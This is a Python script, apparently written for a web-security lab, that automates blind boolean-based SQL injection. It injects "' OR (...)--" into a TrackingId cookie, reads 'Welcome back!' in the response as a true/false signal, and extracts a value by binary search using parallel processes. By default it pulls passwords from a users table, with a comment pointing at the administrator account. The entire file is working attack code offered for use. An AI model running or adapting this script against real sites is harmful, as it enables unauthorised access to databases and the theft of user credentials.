#!/usr/bin/python3
import json,sys,requests,time
from multiprocessing import Pool
from itertools import repeat
from urllib.parse import quote_plus

url = sys.argv[1]
session = requests.Session()

def oracle(query):
    payload = quote_plus(f"' OR ({query})--")
    cookies = {
        "TrackingId": payload
    }
    r = requests.get(url,cookies=cookies)
    #print(request.data)
    #print(r.text)
    #j = json.loads(r.text)
    #return j['status'] == 'taken'
    return 'Welcome back!' in r.text 

# confirm oracle can run correct
"""
assert oracle("1=1")
assert not oracle("1=0")
"""

# Calculate the Length or Count
def dumpInteger(query):
    low = 0
    high = 127
    while low <= high:
        mid = (low+high) // 2
        if oracle(f"LEN(({query})) BETWEEN {low} AND {mid}"):
            high = mid -1
        else:
            low = mid + 1
    return low

def do_binary_search_char(args):
    condition, guess_range = args
    left, right = guess_range
    while right - left > 3:
        guess = int(left + (right - left) / 2)
        if oracle(f"({guess}>({condition}))"):
            right = guess
        else:
            left = guess
    for i in range(left, right):
        if oracle(f"({i}=({condition}))"):
            return i
    return left

# Dumping string
def dumpString(query, length):
    conditions = [f"ASCII(SUBSTRING(({query}),{i},1))" for i in range(1, length + 1)]
    guess_range = (32, 128)
    params = zip(conditions, repeat(guess_range))
    with Pool(10) as pool:
        result = pool.map(do_binary_search_char, params)
    val = ''.join([chr(i) for i in result])
    print(val)
    return val

table = "users" # change this
column = "password" # change this
payload = f"SELECT {column} FROM {table} LIMIT 1 OFFSET 0"  # or WHERE username = 'administrator'
length = dumpInteger(payload)
print(length)
value = dumpString(payload,int(length))
